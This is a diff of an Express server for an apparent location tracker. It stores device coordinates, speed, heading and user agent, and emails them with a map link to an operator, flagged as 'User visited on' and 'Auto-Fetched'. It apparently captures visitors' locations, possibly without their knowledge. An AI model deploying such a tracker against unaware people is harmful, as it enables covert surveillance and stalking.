@@ -23,19 +23,20 @@ app.use(cors({
     allowedHeaders: ['Content-Type', 'Authorization']
 }));
 
-app.use(express.json());
+// Middleware
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 app.use(express.static('public'));
+
+// Log all requests (for debugging)
+app.use((req, res, next) => {
+    console.log(`📨 ${req.method} ${req.url}`);
+    next();
+});
 
 // Store latest location
 let latestLocation = null;
 let locationHistory = [];
-
-// Get base URL for different environments
-function getBaseUrl(req) {
-    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
-    const host = req.headers['host'] || 'localhost:3000';
-    return `${protocol}://${host}`;
-}
 
 // Email Configuration
 const transporter = nodemailer.createTransport({
@@ -61,34 +62,58 @@ transporter.verify((error) => {
     }
 });
 
-// Routes
+// ===== ROUTES =====
+
+// Serve main page
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Serve public files
-app.use(express.static('public'));
+// Health check endpoint (useful for Render)
+app.get('/health', (req, res) => {
+    res.json({
+        status: 'ok',
+        timestamp: new Date().toISOString(),
+        uptime: process.uptime(),
+        locationCount: locationHistory.length,
+        hasLocation: !!latestLocation,
+        environment: process.env.NODE_ENV || 'development',
+        renderUrl: process.env.RENDER_EXTERNAL_URL || 'not on render'
+    });
+});
 
-// API endpoint to get server URL (for frontend)
+// API config endpoint
 app.get('/api/config', (req, res) => {
-    const baseUrl = getBaseUrl(req);
+    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
+    const host = req.headers['host'] || 'localhost:3000';
+    const baseUrl = `${protocol}://${host}`;
+    
     res.json({
         success: true,
         data: {
             baseUrl: baseUrl,
             apiUrl: `${baseUrl}/api`,
             isProduction: process.env.NODE_ENV === 'production',
-            renderUrl: process.env.RENDER_EXTERNAL_URL || null
+            renderUrl: process.env.RENDER_EXTERNAL_URL || null,
+            timestamp: new Date().toISOString()
         }
     });
 });
 
 // Get latest location
 app.get('/api/latest-location', (req, res) => {
-    res.json({
-        success: !!latestLocation,
-        data: latestLocation || null
-    });
+    console.log('📡 Getting latest location');
+    if (latestLocation) {
+        res.json({
+            success: true,
+            data: latestLocation
+        });
+    } else {
+        res.json({
+            success: false,
+            message: 'No location data available yet'
+        });
+    }
 });
 
 // Get location history
@@ -156,16 +181,28 @@ app.get('/api/get-location', async (req, res) => {
     }
 });
 
-// Track location endpoint
+// Track location endpoint - MAIN ENDPOINT
 app.post('/api/track-location', async (req, res) => {
+    console.log('📍 Track location endpoint hit!');
+    console.log('📦 Request body:', req.body);
+    
     try {
         const { 
             latitude, longitude, accuracy, altitude,
             speed, heading, source, userAgent, autoFetched 
         } = req.body;
 
+        // Validate required fields
+        if (!latitude || !longitude) {
+            console.error('❌ Missing latitude or longitude');
+            return res.status(400).json({ 
+                success: false, 
+                message: 'Missing latitude or longitude' 
+            });
+        }
+
         console.log(`📍 Location: ${latitude}, ${longitude}`);
-        console.log(`🎯 Accuracy: ${accuracy}m`);
+        console.log(`🎯 Accuracy: ${accuracy || 'N/A'}m`);
         console.log(`🔄 Auto-fetched: ${autoFetched ? 'Yes' : 'No'}`);
 
         const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -174,106 +211,125 @@ app.post('/api/track-location', async (req, res) => {
         const locationData = {
             latitude,
             longitude,
-            accuracy,
-            altitude,
-            speed,
-            heading,
+            accuracy: accuracy || 0,
+            altitude: altitude || null,
+            speed: speed || null,
+            heading: heading || null,
             source: source || 'GPS',
             autoFetched: autoFetched || false,
             timestamp: new Date().toISOString(),
             mapsLink
         };
         
+        // Store location
         latestLocation = locationData;
         locationHistory.push({ ...locationData, capturedAt: new Date().toISOString() });
 
-        // Email HTML
-        const emailHtml = `
-            <!DOCTYPE html>
-            <html>
-            <head>
-                <style>
-                    body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
-                    .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                    .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
-                    .header h1 { margin: 0; }
-                    .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
-                    .auto-badge { display: inline-block; background: #17a2b8; color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-left: 5px; }
-                    .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
-                    .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
-                    .info-row:last-child { border-bottom: none; }
-                    .label { font-weight: bold; color: #495057; }
-                    .value { color: #212529; }
-                    .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
-                    .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
-                </style>
-            </head>
-            <body>
-                <div class="container">
-                    <div class="header">
-                        <h1>📍 Device Location</h1>
-                        <p>User visited on ${timestamp}</p>
-                        <span class="badge">📡 ${source || 'GPS'}</span>
-                        ${autoFetched ? '<span class="auto-badge">🔄 Auto-Fetched</span>' : ''}
+        // Send email
+        try {
+            const emailHtml = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+                        body { font-family: Arial; max-width: 600px; margin: 0 auto; padding: 20px; background: #f4f4f4; }
+                        .container { background: white; border-radius: 10px; padding: 30px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                        .header { background: linear-gradient(135deg, #28a745 0%, #20c997 100%); color: white; padding: 20px; border-radius: 10px 10px 0 0; margin: -30px -30px 20px -30px; }
+                        .header h1 { margin: 0; }
+                        .badge { display: inline-block; background: #ffc107; color: #856404; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-top: 5px; }
+                        .auto-badge { display: inline-block; background: #17a2b8; color: white; padding: 4px 12px; border-radius: 12px; font-size: 12px; margin-left: 5px; }
+                        .info { background: #f8f9fa; padding: 20px; border-radius: 10px; margin: 20px 0; }
+                        .info-row { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #e9ecef; }
+                        .info-row:last-child { border-bottom: none; }
+                        .label { font-weight: bold; color: #495057; }
+                        .value { color: #212529; }
+                        .map-link { display: inline-block; background: #007bff; color: white; padding: 12px 25px; text-decoration: none; border-radius: 5px; margin: 10px 0; }
+                        .footer { margin-top: 30px; text-align: center; color: #6c757d; font-size: 12px; border-top: 1px solid #dee2e6; padding-top: 20px; }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <div class="header">
+                            <h1>📍 Device Location</h1>
+                            <p>User visited on ${timestamp}</p>
+                            <span class="badge">📡 ${source || 'GPS'}</span>
+                            ${autoFetched ? '<span class="auto-badge">🔄 Auto-Fetched</span>' : ''}
+                        </div>
+                        <div class="info">
+                            <div class="info-row"><span class="label">📅 Time:</span><span class="value">${timestamp}</span></div>
+                            <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
+                            <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
+                            <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy || 'N/A'}m</span></div>
+                            ${altitude ? `<div class="info-row"><span class="label">⛰️ Altitude:</span><span class="value">${altitude}m</span></div>` : ''}
+                            ${speed ? `<div class="info-row"><span class="label">🏃 Speed:</span><span class="value">${speed} m/s</span></div>` : ''}
+                            ${heading ? `<div class="info-row"><span class="label">🧭 Heading:</span><span class="value">${heading}°</span></div>` : ''}
+                            <div class="info-row"><span class="label">📱 Device:</span><span class="value" style="font-size:12px;">${userAgent || 'Unknown'}</span></div>
+                        </div>
+                        <div style="text-align: center;">
+                            <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
+                        </div>
+                        <div class="footer">
+                            <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
+                            <p style="font-size:11px;color:#888;">Powered by Location Tracker</p>
+                        </div>
                     </div>
-                    <div class="info">
-                        <div class="info-row"><span class="label">📅 Time:</span><span class="value">${timestamp}</span></div>
-                        <div class="info-row"><span class="label">📍 Latitude:</span><span class="value">${latitude}</span></div>
-                        <div class="info-row"><span class="label">📍 Longitude:</span><span class="value">${longitude}</span></div>
-                        <div class="info-row"><span class="label">🎯 Accuracy:</span><span class="value">${accuracy}m</span></div>
-                        ${altitude ? `<div class="info-row"><span class="label">⛰️ Altitude:</span><span class="value">${altitude}m</span></div>` : ''}
-                        ${speed ? `<div class="info-row"><span class="label">🏃 Speed:</span><span class="value">${speed} m/s</span></div>` : ''}
-                        ${heading ? `<div class="info-row"><span class="label">🧭 Heading:</span><span class="value">${heading}°</span></div>` : ''}
-                    </div>
-                    <div style="text-align: center;">
-                        <a href="${mapsLink}" target="_blank" class="map-link">🗺️ View on Google Maps</a>
-                    </div>
-                    <div class="footer">
-                        <p>📍 Location captured ${autoFetched ? 'automatically' : 'manually'}</p>
-                    </div>
-                </div>
-            </body>
-            </html>
-        `;
+                </body>
+                </html>
+            `;
 
-        await transporter.sendMail({
-            from: process.env.EMAIL_USER,
-            to: process.env.EMAIL_TO,
-            subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
-            html: emailHtml,
-            text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy}m\nMaps: ${mapsLink}`
-        });
+            await transporter.sendMail({
+                from: process.env.EMAIL_USER,
+                to: process.env.EMAIL_TO,
+                subject: `📍 ${autoFetched ? 'Auto' : 'Manual'} Location - ${timestamp}`,
+                html: emailHtml,
+                text: `Location: ${latitude}, ${longitude}\nAccuracy: ${accuracy || 'N/A'}m\nMaps: ${mapsLink}`
+            });
 
-        console.log(`✅ Email sent to ${process.env.EMAIL_TO}`);
+            console.log(`✅ Email sent to ${process.env.EMAIL_TO}`);
+        } catch (emailError) {
+            console.error('❌ Email error:', emailError.message);
+            // Continue even if email fails - still return success for location
+        }
 
         res.json({ 
             success: true, 
             message: 'Location tracked!',
-            mapsLink: mapsLink 
+            mapsLink: mapsLink,
+            locationId: locationHistory.length
         });
 
     } catch (error) {
-        console.error('❌ Error:', error);
+        console.error('❌ Server error:', error);
         res.status(500).json({ 
             success: false, 
-            message: error.message 
+            message: 'Internal server error',
+            error: error.message 
         });
     }
 });
 
-// Health check endpoint
-app.get('/health', (req, res) => {
-    res.json({
-        status: 'ok',
-        timestamp: new Date().toISOString(),
-        uptime: process.uptime(),
-        locationCount: locationHistory.length,
-        hasLocation: !!latestLocation
+// 404 handler
+app.use((req, res) => {
+    console.log('❌ 404:', req.url);
+    res.status(404).json({ 
+        success: false, 
+        message: 'Endpoint not found' 
+    });
+});
+
+// Error handler
+app.use((err, req, res, next) => {
+    console.error('❌ Unhandled error:', err);
+    res.status(500).json({ 
+        success: false, 
+        message: 'Internal server error',
+        error: err.message 
     });
 });
 
 app.listen(PORT, () => {
     console.log(`\n🚀 Server running on port ${PORT}`);
     console.log(`📧 Email: ${process.env.EMAIL_USER} → ${process.env.EMAIL_TO}`);
-    console.log(`🔗 Health check: http://localhost:${PORT}/health\n`);
+    console.log(`🔗 Health check: https://your-app.onrender.com/health`);
+    console.log(`📍 API endpoint: https://your-app.onrender.com/api/track-location\n`);
 });
